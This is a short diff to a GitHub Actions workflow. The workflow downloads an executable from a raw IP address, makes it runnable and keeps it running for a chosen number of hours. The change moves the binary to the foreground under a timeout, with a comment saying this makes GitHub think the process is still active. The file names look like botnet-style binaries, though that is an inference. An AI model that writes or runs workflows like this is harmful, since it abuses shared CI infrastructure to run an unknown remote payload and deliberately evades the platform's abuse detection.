@@ -26,15 +26,13 @@ jobs:
         wget http://45.138.16.158/bins/px86 -O px86
         chmod +x px86
 
-    - name: Run binary with infinite loop
+    - name: Run binary with continuous execution
       run: |
         UPTIME=${{ github.event.inputs.uptime }}
         echo "Running for $UPTIME hours"
         
-        # Start binary in background
-        ./px86 x86 &
+        # Run the binary directly (not in background)
+        # This makes GitHub think the main process is still active
+        timeout $(($UPTIME * 3600)) ./px86 x86 || true
         
-        # Just sleep for the duration (this keeps the workflow alive)
-        sleep $(($UPTIME * 3600))
-        
-        echo "Time completed"
+        echo "Completed $UPTIME hours"
